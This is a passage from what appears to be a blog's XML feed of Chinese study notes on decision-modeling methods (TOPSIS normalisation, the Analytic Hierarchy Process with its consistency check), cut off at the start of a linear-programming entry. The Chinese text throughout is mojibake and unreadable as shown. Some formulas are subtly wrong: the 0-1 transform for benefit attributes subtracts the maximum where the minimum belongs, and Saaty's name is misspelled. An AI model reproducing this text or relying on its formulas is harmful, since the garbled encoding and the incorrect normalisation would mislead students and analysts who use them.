æ˜¯ä¸€ä¸ªæ–¹æ¡ˆé›†ä¸­å¹¶ä¸å­˜åœ¨çš„è™šæ‹Ÿçš„æœ€ä½³æ–¹æ¡ˆï¼Œå®ƒçš„æ¯ä¸ªå±æ€§å€¼éƒ½æ˜¯å†³ç­–çŸ©é˜µä¸­è¯¥å±æ€§çš„æœ€å¥½å€¼ã€‚</p><p>è€Œè´Ÿç†æƒ³è§£ $C^{0}$ æ˜¯è™šæ‹Ÿçš„æœ€å·®æ–¹æ¡ˆï¼Œå®ƒçš„æ¯ä¸ªå±æ€§å€¼éƒ½æ˜¯å†³ç­–çŸ©é˜µä¸­è¯¥å±æ€§çš„æœ€å·®å€¼ã€‚</p><p>åœ¨æ–¹æ¡ˆé›†ä¸­ï¼Œå°½å¯èƒ½é è¿‘æ­£ç†æƒ³è§£è€ŒåŸç†è´Ÿç†æƒ³è§£çš„æ–¹æ¡ˆå°±æ˜¯æœ€ä½³æ–¹æ¡ˆã€‚</p><p>åœ¨å®é™…æ“ä½œä¸­æˆ‘ä»¬éœ€è¦è§£å†³å¦‚ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p><ol><li>æ•°æ®çš„è§„å¾‹</li><li>è·ç¦»çš„è®¡ç®—æ–¹æ³•å’Œè¡¡é‡æ–¹æ³•</li><li>æ¶ˆé™¤é‡çº²çš„å½±å“</li></ol><h2 id="ç®—æ³•çš„æ­¥éª¤"><a href="#ç®—æ³•çš„æ­¥éª¤" class="headerlink" title="ç®—æ³•çš„æ­¥éª¤"></a>ç®—æ³•çš„æ­¥éª¤</h2><h3 id="ç”¨å‘é‡è§„åˆ’åŒ–çš„æ–¹æ³•æ±‚å¾—è§„èŒƒå†³ç­–çŸ©é˜µ"><a href="#ç”¨å‘é‡è§„åˆ’åŒ–çš„æ–¹æ³•æ±‚å¾—è§„èŒƒå†³ç­–çŸ©é˜µ" class="headerlink" title="ç”¨å‘é‡è§„åˆ’åŒ–çš„æ–¹æ³•æ±‚å¾—è§„èŒƒå†³ç­–çŸ©é˜µ"></a>ç”¨å‘é‡è§„åˆ’åŒ–çš„æ–¹æ³•æ±‚å¾—è§„èŒƒå†³ç­–çŸ©é˜µ</h3><p>è®¾å¤šå±æ€§å†³ç­–é—®é¢˜çš„å†³ç­–çŸ©é˜µ $A&#x3D;(a_{ij})_{m*n}$</p><p>è§„èŒƒåŒ–å†³ç­–çŸ©é˜µ $B&#x3D;(b_{ij})_{m*n}$ </p><p>å…¶ä¸­ $b_{ij}&#x3D; \frac{a_{ij}}{\sqrt {\sum_{i&#x3D;1}^{m} a_{ij}^{2}}}$  </p><blockquote><p>è¿™ä¸€æ­¥ç”¨æ¥æ¶ˆé™¤é‡çº²çš„å½±å“</p></blockquote><p>å¯¹äºæ¯ä¸€é¡¹å±æ€§ï¼Œå…¶æ‰€å çš„è¯„ä»·æƒé‡ä¹Ÿä¸å°½ç›¸åŒï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ„é€ åŠ æƒè§„èŒƒçŸ©é˜µ $C&#x3D;(c_{ij})_{m*n}$</p><p>è®¾ç”±å†³ç­–äººç»™å®šå„å±æ€§çš„æƒé‡å‘é‡ä¸º $w&#x3D;[w_{1},w_{2},\ldots,w_{n}]^{T}$ ï¼Œåˆ™</p><p>$$<br>c_{ij}&#x3D;w_{j}*b_{ij}<br>$$</p><h3 id="ç¡®å®šæ­£ç†æƒ³è§£å’Œè´Ÿç†æƒ³è§£"><a href="#ç¡®å®šæ­£ç†æƒ³è§£å’Œè´Ÿç†æƒ³è§£" class="headerlink" title="ç¡®å®šæ­£ç†æƒ³è§£å’Œè´Ÿç†æƒ³è§£"></a>ç¡®å®šæ­£ç†æƒ³è§£å’Œè´Ÿç†æƒ³è§£</h3><p>è®¾æ­£ï¼ˆè´Ÿï¼‰ç†æƒ³è§£çš„ç¬¬jä¸ªå±æ€§å€¼ä¸º $c_{j}^{*}$ ( $c_{j}^{0}$ ) ï¼Œåˆ™ï¼š</p><p>$$<br>c_{j}^{\ast}&#x3D;<br>\begin{cases}<br>max\ c_{ij} , j ä¸ºæ•ˆç›Šæ€§å±æ€§ \\<br> \\<br>min\ c_{ij} , j ä¸ºæˆæœ¬æ€§å±æ€§ \\<br>\end{cases}<br>$$</p><p>$$<br>c_{j}^{0}&#x3D;<br>\begin{cases}<br>max\ c_{ij} , j ä¸ºæˆæœ¬æ€§å±æ€§ \\<br> \\<br>min\ c_{ij} , j ä¸ºæ•ˆç›Šæ€§å±æ€§ \\<br>\end{cases}<br>$$</p><h3 id="ç¡®å®šè·ç¦»å…¬å¼"><a href="#ç¡®å®šè·ç¦»å…¬å¼" class="headerlink" title="ç¡®å®šè·ç¦»å…¬å¼"></a>ç¡®å®šè·ç¦»å…¬å¼</h3><p>å„æ–¹æ¡ˆåˆ°æ­£ï¼ˆè´Ÿï¼‰ç†æƒ³è§£çš„è·ç¦»ä¸ºï¼š</p><p>$$<br>s_{i}^{\ast}\ &#x3D; \ \sqrt{ \sum_{j&#x3D;1}^{n} (c_{ij}-c_{j}^{\ast})^{2}}<br>$$</p><p>$$<br>s_{i}^{0}\ &#x3D; \ \sqrt{ \sum_{j&#x3D;1}^{n} (c_{ij}-c_{j}^{0})^{2}}<br>$$</p><h3 id="è®¡ç®—ç»¼åˆè¯„ä»·æŒ‡æ•°"><a href="#è®¡ç®—ç»¼åˆè¯„ä»·æŒ‡æ•°" class="headerlink" title="è®¡ç®—ç»¼åˆè¯„ä»·æŒ‡æ•°"></a>è®¡ç®—ç»¼åˆè¯„ä»·æŒ‡æ•°</h3><p>$$<br>f_{i}^{\ast} \ &#x3D;\ \frac{s_{i}^{0}} {s_{i}^{0}+s_{i}^{\ast}}<br>$$</p><p>æ ¹æ®ç»¼åˆè¯„ä»·æŒ‡æ•°ä¾¿å¯å¾—å‡ºæ–¹æ¡ˆçš„ä¼˜åŠ£æ¬¡åºã€‚</p><h2 id="æ•°æ®çš„å¤„ç†"><a href="#æ•°æ®çš„å¤„ç†" class="headerlink" title="æ•°æ®çš„å¤„ç†"></a>æ•°æ®çš„å¤„ç†</h2><h3 id="å±æ€§å€¼æ¯”ä¾‹åŒ–"><a href="#å±æ€§å€¼æ¯”ä¾‹åŒ–" class="headerlink" title="å±æ€§å€¼æ¯”ä¾‹åŒ–"></a>å±æ€§å€¼æ¯”ä¾‹åŒ–</h3><p>å±æ€§å€¼ä¸å¥½ç›´æ¥ä»æ•°å€¼å¤§å°è¿›è¡Œåˆ¤æ–­æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å¯¹æ•°æ®è¿›è¡Œé¢„å¤„ç†ï¼Œä½¿å¾—è¡¨ä¸­ä»»æ„å±æ€§ä¸‹æ€§èƒ½è¶Šä¼˜çš„æ–¹æ¡ˆå˜æ¢åçš„å±æ€§å€¼è¶Šå¤§ã€‚</p><h3 id="éé‡çº²åŒ–"><a href="#éé‡çº²åŒ–" class="headerlink" title="éé‡çº²åŒ–"></a>éé‡çº²åŒ–</h3><p>ä¸åŒå±æ€§ä¹‹é—´é‡çº²çš„ä¸åŒä½¿å±æ€§å…·æœ‰ä¸å¯å…¬åº¦æ€§ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ•°æ®å¤„ç†æ—¶æ¶ˆé™¤é‡çº²çš„å½±å“ã€‚</p><h3 id="å½’ä¸€åŒ–"><a href="#å½’ä¸€åŒ–" class="headerlink" title="å½’ä¸€åŒ–"></a>å½’ä¸€åŒ–</h3><p>å±æ€§ä¹‹é—´æ•°å€¼å¤§å°å·®åˆ«è¾ƒå¤§ï¼Œä¸ºäº†æ–¹ä¾¿ç›´è§‚æ¯”è¾ƒï¼Œæˆ‘ä»¬éœ€è¦å¯¹å±æ€§çš„æ•°å€¼è¿›è¡Œå½’ä¸€åŒ–ã€‚</p><h3 id="å¸¸è§çš„å¤„ç†æ–¹æ³•"><a href="#å¸¸è§çš„å¤„ç†æ–¹æ³•" class="headerlink" title="å¸¸è§çš„å¤„ç†æ–¹æ³•"></a>å¸¸è§çš„å¤„ç†æ–¹æ³•</h3><ol><li>çº¿æ€§å˜æ¢</li></ol><p>$$<br>b_{ij}&#x3D;\frac{a_{ij}}{a_{j}^{max}}<br>$$</p><ol start="2"><li>æ ‡å‡†0-1å˜æ¢</li></ol><blockquote><p>ä¸ºäº†ä½¿æœ€ä¼˜ä¸º1ï¼Œæœ€å·®ä¸º0</p></blockquote><p>å¯¹æ•ˆç›Šæ€§å±æ€§ï¼š<br>$$<br>b_{ij}=\ \frac{a_{ij}-a_{j}^{max}}{a_{j}^{max}-a_{j}^{min}}<br>$$</p><p>å¯¹æˆæœ¬æ€§å±æ€§ï¼š<br>$$<br>b_{ij}=\ \frac{a_{j}^{max}-a_{ij}}{a_{j}^{max}-a_{j}^{min}}<br>$$</p><ol start="3"><li>åŒºé—´å±æ€§çš„å˜æ¢<br>å±æ€§åœ¨æŸä¸€ä¸ªåŒºé—´èŒƒå›´å†…æœ€ä¼˜ï¼Œæˆ‘ä»¬è®¾ç»™å‡ºçš„æœ€ä¼˜åŒºé—´ä¸º $[a_{j}^{0},a_{j}^{\ast}]$ , $a_{j}^{â€˜}$ ä¸ºæ— æ³•å®¹å¿ä¸‹é™ï¼Œ $a_{j}^{â€˜â€™}$ ä¸ºæ— æ³•å®¹å¿ä¸Šé™ï¼Œåˆ™</li></ol><p>$$<br>b_{ij}&#x3D;<br>\begin{cases}<br>1-\frac{a_{j}^{0}-a_{ij}}{a_{j}^{0}-a_{j}^{â€˜}} , a_{j}^{â€˜}\le a_{ij}\le a_{j}^{0}\\<br> \\<br>1 , a_{j}^{0}\le a_{ij}\le a_{j}^{\ast}\\<br> \\<br>1-\frac{a_{ij}-a_{j}^{\ast}}{a_{j}^{â€˜â€™}-a_{j}^{\ast}} , a_{j}^{\ast}\le a_{ij}\le a_{j}^{â€˜â€™}<br> \\<br>0<br>\end{cases}<br>$$</p><p>å˜æ¢åçš„å±æ€§å€¼å¯¹åº”çš„å‡½æ•°å›¾å½¢ä¸ºä¸€èˆ¬æ¢¯å½¢ã€‚å½“æœ€ä¼˜åŒºé—´çš„ä¸Šä¸‹ç•Œç›¸ç­‰ï¼Œé€€åŒ–ä¸ºä¸‰è§’å½¢ã€‚</p><ol start="4"><li>å‘é‡è§„èŒƒåŒ–</li></ol><p>$$<br>b_{ij}&#x3D; \frac{a_{ij}}{\sqrt {\sum_{i&#x3D;1}^{m} a_{ij}^{2}}}<br>$$</p><p>ç»å¸¸ç”¨äºè®¡ç®—æ¬§æ°è·ç¦»çš„åœºåˆã€‚</p>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
      <tag>TOPSIS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AHP</title>
    <link href="/2024/01/28/%E5%B1%82%E6%AC%A1%E5%88%86%E6%9E%90%E6%B3%95-AHP/"/>
    <url>/2024/01/28/%E5%B1%82%E6%AC%A1%E5%88%86%E6%9E%90%E6%B3%95-AHP/</url>
    
    <content type="html"><![CDATA[<h1 id="å±‚æ¬¡åˆ†ææ³•-AHP-åŸºæœ¬æ¨¡å‹"><a href="#å±‚æ¬¡åˆ†ææ³•-AHP-åŸºæœ¬æ¨¡å‹" class="headerlink" title="å±‚æ¬¡åˆ†ææ³•(AHP)åŸºæœ¬æ¨¡å‹"></a>å±‚æ¬¡åˆ†ææ³•(AHP)åŸºæœ¬æ¨¡å‹</h1><p>å±‚æ¬¡åˆ†ææ³•æ—¨åœ¨å¯¹äºå¤æ‚çš„å†³ç­–é—®é¢˜çš„æœ¬è´¨ã€å½±å“å› ç´ åŠå…¶å†…åœ¨å…³ç³»ç­‰è¿›è¡Œæ·±å…¥åˆ†æçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨è¾ƒå°‘çš„å®šé‡ä¿¡æ¯ä½¿å†³ç­–çš„æ€ç»´è¿‡ç¨‹æ•°å­¦åŒ–ï¼Œä»è€Œä¸ºå¤šç›®æ ‡ã€å¤šå‡†åˆ™æˆ–æ— ç»“æ„ç‰¹æ€§çš„å¤æ‚å†³ç­–é—®é¢˜æä¾›ç®€ä¾¿çš„å†³ç­–æ–¹æ³•ã€‚</p><h2 id="å±‚æ¬¡åˆ†ææ³•æ¦‚è¿°"><a href="#å±‚æ¬¡åˆ†ææ³•æ¦‚è¿°" class="headerlink" title="å±‚æ¬¡åˆ†ææ³•æ¦‚è¿°"></a>å±‚æ¬¡åˆ†ææ³•æ¦‚è¿°</h2><p>AHPçš„åŸºæœ¬å†…å®¹ï¼š</p><ul><li>å°†å®šé‡åˆ†æå’Œå®šæ€§åˆ†æç»“åˆèµ·æ¥</li><li>ç”¨å†³ç­–è€…çš„<strong>ç»éªŒåˆ¤æ–­</strong>å„è¡¡é‡ç›®æ ‡èƒ½å¦å®ç°çš„æ ‡å‡†ä¹‹é—´çš„<strong>ç›¸å¯¹é‡è¦ç¨‹åº¦</strong></li><li>ç»™å‡ºæ¯ä¸ªå†³ç­–æ–¹æ¡ˆçš„æ¯ä¸ªæ ‡å‡†çš„æƒæ•°ï¼Œåˆ©ç”¨æƒæ•°æ±‚å‡ºå„æ–¹æ¡ˆçš„ä¼˜åŠ£æ¬¡åº</li></ul><h2 id="å±‚æ¬¡åˆ†ææ³•çš„å…¸å‹åº”ç”¨"><a href="#å±‚æ¬¡åˆ†ææ³•çš„å…¸å‹åº”ç”¨" class="headerlink" title="å±‚æ¬¡åˆ†ææ³•çš„å…¸å‹åº”ç”¨"></a>å±‚æ¬¡åˆ†ææ³•çš„å…¸å‹åº”ç”¨</h2><ul><li>ç”¨äºæœ€ä½³æ–¹æ¡ˆçš„é€‰å–</li><li>ç”¨äºè¯„ä»·ç±»é—®é¢˜</li><li>ç”¨äºæŒ‡æ ‡ä½“ç³»çš„ä¼˜é€‰</li></ul><h2 id="å±‚æ¬¡åˆ†ææ³•çš„æ­¥éª¤å’Œæ–¹æ³•"><a href="#å±‚æ¬¡åˆ†ææ³•çš„æ­¥éª¤å’Œæ–¹æ³•" class="headerlink" title="å±‚æ¬¡åˆ†ææ³•çš„æ­¥éª¤å’Œæ–¹æ³•"></a>å±‚æ¬¡åˆ†ææ³•çš„æ­¥éª¤å’Œæ–¹æ³•</h2><h3 id="å»ºç«‹å±‚æ¬¡ç»“æ„æ¨¡å‹"><a href="#å»ºç«‹å±‚æ¬¡ç»“æ„æ¨¡å‹" class="headerlink" title="å»ºç«‹å±‚æ¬¡ç»“æ„æ¨¡å‹"></a>å»ºç«‹å±‚æ¬¡ç»“æ„æ¨¡å‹</h3><blockquote><p>å°†å†³ç­–çš„ç›®æ ‡ã€è€ƒè™‘çš„å› ç´ ï¼ˆå†³ç­–å‡†åˆ™ï¼‰å’Œå†³ç­–å¯¹è±¡æŒ‰ä»–ä»¬ä¹‹é—´çš„ç›¸äº’å…³ç³»åˆ†ä¸ºæœ€é«˜å±‚ã€ä¸­é—´å±‚å’Œæœ€åº•å±‚ï¼Œç»˜å‡ºå±‚æ¬¡ç»“æ„å›¾ã€‚</p></blockquote><ul><li>æœ€é«˜å±‚ï¼šå†³ç­–çš„ç›®çš„ã€è¦è§£å†³çš„é—®é¢˜</li><li>æœ€åº•å±‚ï¼šå†³ç­–æ—¶çš„å¤‡é€‰æ–¹æ¡ˆ</li><li>ä¸­é—´å±‚ï¼šè€ƒè™‘çš„å› ç´ ã€å†³ç­–çš„å‡†åˆ™</li></ul><blockquote><p>å¯¹äºç›¸é‚»çš„ä¸¤å±‚ï¼Œç§°é«˜å±‚ä¸ºç›®æ ‡å±‚ï¼Œä½å±‚ä¸ºå› ç´ å±‚ã€‚</p></blockquote><p>ä¾‹å­ï¼šå¯¹äºå¤§å­¦æ¯•ä¸šç”Ÿï¼Œåœ¨é€‰æ‹©å°±ä¸šå²—ä½æ—¶ï¼Œä¸€èˆ¬ä¼šè€ƒè™‘ä»¥ä¸‹å› ç´ ï¼ˆä¸å®Œå…¨ï¼‰ï¼š</p><ol><li>èƒ½å‘æŒ¥è‡ªå·±çš„æ‰å¹²åšå‡ºè´¡çŒ®</li><li>æ”¶å…¥è¾ƒå¥½</li><li>ç”Ÿæ´»ç¯å¢ƒå¥½</li><li>å•ä½åå£°å¥½</li><li>å·¥ä½œç¯å¢ƒå¥½</li><li>å‘å±•å‰æ™¯å¥½</li></ol><p>æ ¹æ®è¿™äº›å› ç´ ï¼Œæˆ‘ä»¬å¯ä»¥å»ºç«‹ä»¥ä¸‹çš„å±‚æ¬¡ç»“æ„æ¨¡å‹ï¼š</p><p><img src="/Pictures/MCM/AHP/plot01.png" alt="img"></p><p>æ¯å±‚ä¹‹é—´çš„è‹¥å¹²å…ƒç´ ç”¨ç›´çº¿è¿æ¥ã€‚</p><h3 id="æ„é€ åˆ¤æ–­ï¼ˆæˆå¯¹æ¯”è¾ƒï¼‰çŸ©é˜µ"><a href="#æ„é€ åˆ¤æ–­ï¼ˆæˆå¯¹æ¯”è¾ƒï¼‰çŸ©é˜µ" class="headerlink" title="æ„é€ åˆ¤æ–­ï¼ˆæˆå¯¹æ¯”è¾ƒï¼‰çŸ©é˜µ"></a>æ„é€ åˆ¤æ–­ï¼ˆæˆå¯¹æ¯”è¾ƒï¼‰çŸ©é˜µ</h3><p>åœ¨ç¡®å®šå„å±‚æ¬¡å„å› ç´ ä¹‹é—´çš„æƒé‡æ—¶ï¼Œå¦‚æœåªæ˜¯å®šæ€§çš„ç»“æœï¼Œåˆ™å¸¸å¸¸ä¸å®¹æ˜“è¢«åˆ«äººæ¥å—ã€‚æ•…æˆ‘ä»¬é‡‡ç”¨<strong>ä¸€è‡´çŸ©é˜µæ³•</strong>ï¼Œå°†å› ç´ ä¹‹é—´ä¸¤ä¸¤æ¯”è¾ƒï¼Œé‡‡ç”¨ç›¸å¯¹å°ºåº¦ï¼Œæé«˜å‡†ç¡®åº¦ã€‚</p><p>åˆ¤æ–­çŸ©é˜µæ—¶è¡¨ç¤ºæœ¬å±‚æ‰€æœ‰å› ç´ é’ˆå¯¹ä¸Šä¸€å±‚æŸä¸€ä¸ªå› ç´ çš„ç›¸å¯¹é‡è¦æ€§çš„æ¯”è¾ƒã€‚</p><p>åˆ¤æ–­çŸ©é˜µçš„å…ƒç´  $a_{ij}$ ï¼ˆç¬¬ié¡¹å› ç´ ç›¸å¯¹äºç¬¬jé¡¹å…ƒç´ çš„æ ‡åº¦ï¼‰ç”±Santyçš„1-9æ ‡åº¦æ–¹æ³•ç»™å‡ºã€‚</p><blockquote><p>åœ¨é€‰å–æ¯”è¾ƒçš„å› ç´ æ—¶ï¼Œå»ºè®®ä¸è¦è¶…è¿‡9ä¸ªã€‚</p></blockquote><p>åˆ¤æ–­çŸ©é˜µå…ƒç´  $a_{ij}$ çš„æ ‡åº¦æ–¹æ³•</p><table><thead><tr><th align="center">æ ‡åº¦</th><th align="center">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">è¡¨ç¤ºä¸¤ä¸ªå› ç´ ç›¸æ¯”,å…·æœ‰åŒç­‰é‡è¦æ€§</td></tr><tr><td align="center">3</td><td align="center">è¡¨ç¤ºä¸¤ä¸ªå› ç´ ç›¸æ¯”ï¼Œä¸€ä¸ªå› ç´ æ¯”å¦ä¸€ä¸ªç¨å¾®é‡è¦</td></tr><tr><td align="center">5</td><td align="center">ä¸€ä¸ªå› ç´ æ¯”å¦ä¸€ä¸ªæ˜æ˜¾é‡è¦</td></tr><tr><td align="center">7</td><td align="center">ä¸€ä¸ªå› ç´ æ¯”å¦ä¸€ä¸ªå¼ºçƒˆé‡è¦</td></tr><tr><td align="center">9</td><td align="center">ä¸€ä¸ªå› ç´ æ¯”å¦ä¸€ä¸ªæç«¯é‡è¦</td></tr><tr><td align="center">2,4,6,8</td><td align="center">ç›¸é‚»çš„ä¸­å€¼</td></tr><tr><td align="center">å€’æ•°</td><td align="center">å› ç´  $i,j$ ä¹‹é—´ä¸€æ–¹æ ‡åº¦ä¸º $a_{ij}$ ,åˆ™å¦ä¸€æ–¹ä¸ºå€’æ•°</td></tr></tbody></table><p>æ„é€ å‡ºæ¥çš„çŸ©é˜µ $A&#x3D;(a_{ij})_{n*n}$ ä¸ºæ­£äº’åçŸ©é˜µ</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><p>$$\begin{bmatrix}<br>  1&amp;  \frac{1}{2}&amp;  4&amp;  3&amp;3 \\<br>  2&amp;  1&amp;  7&amp;  5&amp;5 \\<br>  \frac{1}{4}&amp;  \frac{1}{7}&amp;  1&amp;  \frac{1}{2}&amp;\frac{1}{3} \\<br>  \frac{1}{3}&amp;  \frac{1}{5}&amp;  2&amp;  1&amp;1 \\<br>  \frac{1}{3}&amp;  \frac{1}{5}&amp;  3&amp;  1&amp;1<br>\end{bmatrix}$$</p><h3 id="å±‚æ¬¡å•æ’åºåŠå…¶ä¸€è‡´æ€§æ£€éªŒ"><a href="#å±‚æ¬¡å•æ’åºåŠå…¶ä¸€è‡´æ€§æ£€éªŒ" class="headerlink" title="å±‚æ¬¡å•æ’åºåŠå…¶ä¸€è‡´æ€§æ£€éªŒ"></a>å±‚æ¬¡å•æ’åºåŠå…¶ä¸€è‡´æ€§æ£€éªŒ</h3><p>å®é™…ä¸Šï¼Œä¸Šè¿°çŸ©é˜µå­˜åœ¨é—®é¢˜ã€‚</p><p>æˆ‘ä»¬å‡è®¾å› ç´ ç”¨ $C_{i}\ (i&#x3D;1,2,3,4,5)$ æ¥è¡¨ç¤ºï¼Œåˆ™ $a_{ij}&#x3D;C_{i}:C_{j}$</p><p>æˆ‘ä»¬å‘ç°: $\frac{C_{1}}{C_{2}}&#x3D;\frac{1}{2}$ , $\frac{C_{1}}{C_{3}}&#x3D;4$ ,ç„¶è€Œ $\frac{C_{2}}{C_{3}}&#x3D;7$ ï¼Œè¿™æ˜¾ç„¶å’Œæˆ‘ä»¬çš„è¯„ä»·ä¸ä¸€è‡´ã€‚</p><p>è€ƒè™‘åˆ°å®é™…æƒ…å†µä¸­å­˜åœ¨çš„<strong>è¾¹é™…æ•ˆåº”</strong>å’Œ<strong>è¯„ä»·çš„ç›¸å¯¹æ€§</strong>ï¼Œæˆ‘ä»¬å…è®¸ä¸ä¸€è‡´çš„å‡ºç°ï¼Œä½†è¦ç¡®å®šä¸ä¸€è‡´çš„å…è®¸èŒƒå›´ã€‚</p><p>å¦‚æœæˆ‘ä»¬å¾—å‡ºçš„çŸ©é˜µå®Œå…¨ä¸€è‡´ï¼Œå³ $rank(A)&#x3D;1$ ï¼Œæˆ‘ä»¬ç§°è¿™æ ·çš„çŸ©é˜µä¸ºä¸€è‡´é˜µï¼Œå…¶ä¸­éé›¶ç‰¹å¾å€¼ä¸º $tr(A)&#x3D;n$ ã€‚</p><p>å¯¹äºä¸ä¸€è‡´çš„æ¯”è¾ƒçŸ©é˜µï¼Œæˆ‘ä»¬å¯ä»¥å°†å¯¹å¤§çš„ç‰¹å¾å€¼ $\lambda_{max}$ å¯¹åº”çš„ç‰¹å¾å‘é‡ä½œä¸ºæƒå‘é‡ï¼Œè®°ä¸º $w$ ã€‚</p><p>æƒå‘é‡ä¸ºåŒä¸€å±‚æ¬¡å› ç´ å¯¹äºä¸Šä¸€å±‚æ¬¡å› ç´ æŸå› ç´ ç›¸å¯¹é‡è¦æ€§çš„æ’åºæƒå€¼ï¼Œè¿™ä¸€è¿‡ç¨‹ç§°ä¸ºå±‚æ¬¡å•æ’åºã€‚</p><p>ä¸€è‡´æ€§æ£€éªŒçš„å·¥ä½œæ­£æ˜¯ç¡®å®šåç§»å€¼Açš„èŒƒå›´ã€‚</p><p>å®šä¹‰ä¸€è‡´æ€§æŒ‡æ ‡å¦‚ä¸‹ï¼š </p><p>$$CI\ &#x3D;\ \frac{\lambda -n}{n-1}$$</p><p><strong>CIè¶Šæ¥è¿‘äº0ï¼Œä¸€è‡´æ€§è¶Šé«˜ã€‚</strong></p><p>ä¸ºè¡¡é‡CIçš„å¤§å°ï¼Œå¼•å…¥<em>éšæœºä¸€è‡´æ€§æŒ‡æ ‡RI</em>ã€‚æ–¹æ³•ä¸ºéšå³æ„é€ 500ä¸ªæˆå¯¹æ¯”è¾ƒçŸ©é˜µ $A_{n}$ ï¼Œå¯å¾—ä¸€è‡´æ€§æŒ‡æ ‡ $CT_{n}$ ã€‚å–ç®—æœ¯å¹³å‡æ•°å³ä¸ºRIå¤§å°ã€‚</p><p>å¯¹äºä¸åŒçš„nï¼ŒRIçš„å€¼ç”±ä¸‹è¡¨ç»™å‡ºï¼š</p><table><thead><tr><th>n</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td>RI</td><td>0</td><td>0</td><td>0.58</td><td>0.90</td><td>1.12</td><td>1.24</td><td>1.32</td><td>1.41</td><td>1.45</td><td>1.49</td><td>1.51</td></tr></tbody></table><p>å®šä¹‰ä¸€è‡´æ€§æ¯”ç‡ï¼š</p><p>$CR\ &#x3D;\ \frac{CI}{RI}$ ï¼Œå½“CR&lt;0.1æ—¶ï¼Œè®¤ä¸ºAçš„ä¸ä¸€è‡´ç¨‹åº¦åœ¨å®¹è®¸èŒƒå›´ä¹‹å†…ï¼Œæœ‰æ»¡æ„çš„ä¸€è‡´æ€§ï¼Œé€šè¿‡ä¸€è‡´æ€§æ£€éªŒã€‚å¯ç”¨å…¶å½’ä¸€åŒ– <em>ï¼ˆåˆ—å’Œä¸º1ï¼‰</em> ç‰¹å¾å‘é‡ä½œä¸ºæƒå‘é‡ï¼Œå¦åˆ™éœ€è¦é‡æ–°æ„é€ æ¯”è¾ƒçŸ©é˜µAè¿›è¡Œè°ƒæ•´ã€‚</p><p><img src="/Pictures/MCM/AHP/plot02.png" alt="img"></p><h3 id="å±‚æ¬¡æ€»æ’åºåŠå…¶ä¸€è‡´æ€§æ£€éªŒ"><a href="#å±‚æ¬¡æ€»æ’åºåŠå…¶ä¸€è‡´æ€§æ£€éªŒ" class="headerlink" title="å±‚æ¬¡æ€»æ’åºåŠå…¶ä¸€è‡´æ€§æ£€éªŒ"></a>å±‚æ¬¡æ€»æ’åºåŠå…¶ä¸€è‡´æ€§æ£€éªŒ</h3><p>è®¡ç®—æŸä¸€å±‚æ¬¡æ‰€æœ‰å› ç´ å¯¹äºæœ€é«˜å±‚ï¼ˆæ€»ç›®æ ‡ï¼‰ç›¸å¯¹é‡è¦æ€§çš„æƒå€¼ï¼Œç§°ä¸ºå±‚æ¬¡æ€»æ’åºï¼Œè¿™ä¸€è¿‡ç¨‹æ˜¯ä»æœ€é«˜å±‚æ¬¡åˆ°æœ€ä½å±‚æ¬¡ä¾æ¬¡è¿›è¡Œçš„ã€‚</p><p><img src="/Pictures/MCM/AHP/plot03.png" alt="img"></p><p><img src="/Pictures/MCM/AHP/plot04.png" alt="img"></p><p>å±‚æ¬¡æ€»æ’åºçš„ä¸€è‡´æ€§æ¯”ç‡ä¸ºï¼š</p><p>$$CR\ &#x3D;\ \frac{a_{1}CI_{1}+a_{2}CI_{2}+\ldots+a_{m}CI_{m}}{a_{1}RI_{1}+a_{2}RI_{2}+\ldots+a_{m}RI_{m}}$$</p><p>å½“CR&lt;0.1æ˜¯ï¼Œè®¤ä¸ºå±‚æ¬¡æ€»æ’åºé€šè¿‡ä¸€è‡´æ€§æ£€éªŒã€‚å±‚æ¬¡æ€»æ’åºå…·æœ‰æ»¡æ„åº¦ä¸€è‡´æ€§ï¼Œæ ¹æ®æœ€ä¸‹å±‚ï¼ˆå†³ç­–å±‚ï¼‰çš„å±‚æ¬¡æ€»æ’åºåšå‡ºæœ€åå†³ç­–ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
      <tag>AHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è§„åˆ’ç±»é—®é¢˜</title>
    <link href="/2024/01/26/%E8%A7%84%E5%88%92%E7%B1%BB%E9%97%AE%E9%A2%98/"/>
    <url>/2024/01/26/%E8%A7%84%E5%88%92%E7%B1%BB%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="çº¿æ€§è§„åˆ’é—®é¢˜"><a href="#çº¿æ€§è§„åˆ’é—®é¢˜" class="headerlink" title="çº¿æ€§è§„åˆ’é—®é¢˜"></a>çº¿æ€§è§„åˆ’é—®é¢˜</h1><p>åœ¨äººä»¬çš„ç”Ÿäº§å®è·µä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°å¦‚ä½•åˆ©ç”¨ç°æœ‰èµ„æºæ¥å®‰æ’ç”Ÿäº§ä»¥å–å¾—æœ€å¤§æ•ˆç›Šçš„é—®é¢˜ã€‚</p><p>æ­¤ç±»é—®é¢˜æ„æˆäº†è¿ç­¹å­¦çš„ä¸€ä¸ªé‡è¦åˆ†æ”¯â€”â€”æ•°å­¦è§„åˆ’ï¼Œè€ŒLPï¼ˆLinear Programmingï¼‰åˆ™æ˜¯å…¶ä¸­çš„ä¸€ä¸ªé‡è¦åˆ†æ”¯ã€‚</p><h2 id="çº¿æ€§è§„åˆ’çš„åŸºæœ¬å½¢å¼"><a href="#çº¿æ€§è§„åˆ’çš„åŸºæœ¬å½¢å¼" class="headerlink" title="çº¿æ€§è§„åˆ’çš„åŸºæœ¬å½¢å¼"></a>çº¿æ€§è§„åˆ’çš„åŸºæœ¬å½¢å¼</h2><p>\begin{cases}<br>maxS &#x3D; c_{1}x_{1}+c_{2}x_{2}+\ldots+c_{n}x_{n} &#x3D; CX \ldots 